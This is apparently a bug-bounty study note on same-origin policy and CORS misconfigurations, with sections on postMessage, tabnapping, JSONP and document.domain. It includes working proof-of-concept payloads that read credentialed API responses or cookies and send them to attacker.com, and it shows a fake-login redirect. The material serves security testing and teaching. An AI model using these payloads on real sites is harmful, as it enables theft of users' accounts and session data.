# Same-Origin Policy (SOP) & CORS Misconfigurations
> Sources: Bug Bounty Bootcamp (Li), Real-World Bug Hunting (Yaworski), The Tangled Web (Zalewski), WSTG v4.2

## Same-Origin Policy (The Tangled Web)

### What Is an Origin
```
Origin = Protocol + Host + Port
https://example.com:443

# Same origin:
https://example.com/page1  and  https://example.com/page2  ✓

# Different origin:
http://example.com     and  https://example.com           ✗ (protocol)
https://example.com    and  https://sub.example.com        ✗ (host)
https://example.com    and  https://example.com:8080       ✗ (port)
```

### What SOP Controls
- JavaScript on one origin **cannot read** responses from another origin (XHR, Fetch)
- JavaScript **cannot read** cookies from another origin
- But: **can send** requests to other origins (forms, img src, script src, link)
- Embedded resources (img, script, link) can cross origins but **cannot be read**

### IE Exception (The Tangled Web)
- Internet Explorer ignores port in SOP comparison
- `https://example.com:80` and `https://example.com:8080` are same origin to IE

---

## CORS Misconfiguration

### How CORS Works
Server signals allowed cross-origin requests:
```
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
```

**Simple requests** (GET, POST with form content-type) are sent immediately.

**Non-simple requests** trigger preflight OPTIONS:
```
OPTIONS /api/data
Origin: https://attacker.com
Access-Control-Request-Method: DELETE
```

### Dangerous CORS Configurations

#### 1. Reflecting Request Origin (Most Common)
```javascript
// Vulnerable server code:
response.setHeader("Access-Control-Allow-Origin", request.headers.origin);
response.setHeader("Access-Control-Allow-Credentials", "true");
// → Any origin can read credentialed responses
```

Test:
```bash
curl -H "Origin: https://attacker.com" https://target.com/api/endpoint -v
# Look for: Access-Control-Allow-Origin: https://attacker.com
#           Access-Control-Allow-Credentials: true
```

#### 2. Null Origin Allowed
```
# Sandboxed iframes send Origin: null
# Redirect chains send Origin: null
# file:// pages send Origin: null
```

Exploit via sandboxed iframe:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
fetch('https://target.com/api/sensitive', {credentials:'include'})
  .then(r=>r.text())
  .then(d=>fetch('https://attacker.com/?d='+encodeURIComponent(d)));
</script>
"></iframe>
```

#### 3. Wildcard with Credentials
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# Spec says: can't combine * with credentials — but some servers allow it
```

#### 4. Weak Regex / EndsWith Check
If server checks `origin.endsWith('.example.com')`:
```
# Bypass:
https://evil.example.com  → legitimate subdomain
```

If server checks `origin.startsWith('https://example.com')`:
```
# Bypass:
https://example.com.attacker.com
```

#### 5. HTTP Origin Trusted by HTTPS
```bash
curl https://secure-target.com/api/data -H "Origin: http://secure-target.com"
# If response includes: Access-Control-Allow-Origin: http://secure-target.com → vulnerable
```

### CORS Testing Methodology
```bash
# Test 1: Reflect arbitrary origin
curl -s "https://target.com/api/data" -H "Origin: https://attacker.com" -H "Cookie: session=VICTIM_SESSION" -I | grep -i "access-control"

# Test 2: Null origin
curl -s "https://target.com/api/data" -H "Origin: null" -I | grep -i "access-control"

# Test 3: Subdomain bypass
curl -s "https://target.com/api/data" -H "Origin: https://evil.target.com" -I | grep -i "access-control"

# Test 4: HTTP origin
curl -s "https://target.com/api/data" -H "Origin: http://target.com" -I | grep -i "access-control"

# Burp Scanner + Param Miner detect CORS automatically
```

### Complete CORS Exploit PoC
```html
<!DOCTYPE html>
<html>
<body>
<script>
fetch('https://target.com/api/account', { credentials: 'include' })
  .then(response => response.json())
  .then(data => {
    var img = new Image();
    img.src = 'https://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(data));
  });
</script>
</body>
</html>
```

---

## postMessage Vulnerabilities (The Tangled Web)

### Unsafe postMessage Recipient
```javascript
// VULNERABLE: not validating origin
window.addEventListener('message', function(event) {
  eval(event.data);  // Executes anything from any origin!
  document.getElementById('result').innerHTML = event.data;  // XSS!
});

// SECURE: validate origin strictly
window.addEventListener('message', function(event) {
  if (event.origin !== 'https://trusted.example.com') return;
  // process event.data safely
});
```

### Attacking Insecure postMessage
```javascript
var victim = window.open('https://target.com/page');
setTimeout(function() {
  victim.postMessage('<img src=x onerror=fetch("https://attacker.com/?c="+document.cookie)>', '*');
}, 1000);
```

---

## window.opener Tabnapping (The Tangled Web)

```html
<!-- If target page opens new windows without rel="noopener": -->
<a href="https://target.com/page" target="_blank">Link</a>

<!-- Attacker's page (the newly opened tab) can navigate the opener: -->
<script>
window.opener.location = 'https://attacker.com/fake-target-login';
</script>
<!-- User's original target.com tab now shows attacker's fake login page -->
```

---

## JSONP Security Issues (The Tangled Web)

```javascript
// JSONP endpoint: /api/data?callback=CALLBACK_NAME
// Returns: CALLBACK_NAME({"data":"..."})

// Attacker:
function stealData(data) {
  fetch('https://attacker.com/?d=' + JSON.stringify(data));
}
// <script src="https://target.com/api/data?callback=stealData"></script>
```

### JSONP Callback Injection
If callback parameter is not restricted to alphanumerics:
```
/api/jsonp?callback=alert(1);//
/api/jsonp?callback=fetch('https://attacker.com/?d='+document.cookie);//
```

---

## CORS + CSP Interaction (The Tangled Web)

If CORS allows an origin and CSP whitelists that same domain with a JSONP endpoint:
```
# If example.com/jsonp?callback= exists:
# Attacker can inject arbitrary script through CSP-whitelisted JSONP
script-src https://example.com → vulnerable if JSONP endpoint exists
```

---

## document.domain Relaxation (The Tangled Web)

```javascript
// Both pages must set document.domain to share origin:
// page: https://sub.example.com → document.domain = 'example.com';
// page: https://example.com → document.domain = 'example.com';
// Now they share the same origin

// ATTACK: If you control any subdomain (XSS, subdomain takeover):
// Set document.domain = 'example.com' → access all .example.com pages
```

---

## Testing Checklist
- [ ] Test all API endpoints with foreign Origin header
- [ ] Test null origin (via sandboxed iframe PoC)
- [ ] Test subdomain bypass (evil.target.com, target.com.attacker.com)
- [ ] Test HTTP origin on HTTPS endpoint
- [ ] Look for JSONP endpoints with open callback parameter
- [ ] Test postMessage listeners for origin validation
- [ ] Check for window.opener use (links with target="_blank")
- [ ] Check for document.domain relaxation
- [ ] Write exploit PoC showing data theft

## Severity
- **Medium**: CORS without credentials (can't steal authenticated data)
- **High**: CORS with credentials (steal auth'd user data, tokens)
- **High**: JSONP with unvalidated callback (XSS on target origin)
- **Critical**: CORS misconfiguration + sensitive data = full account compromise
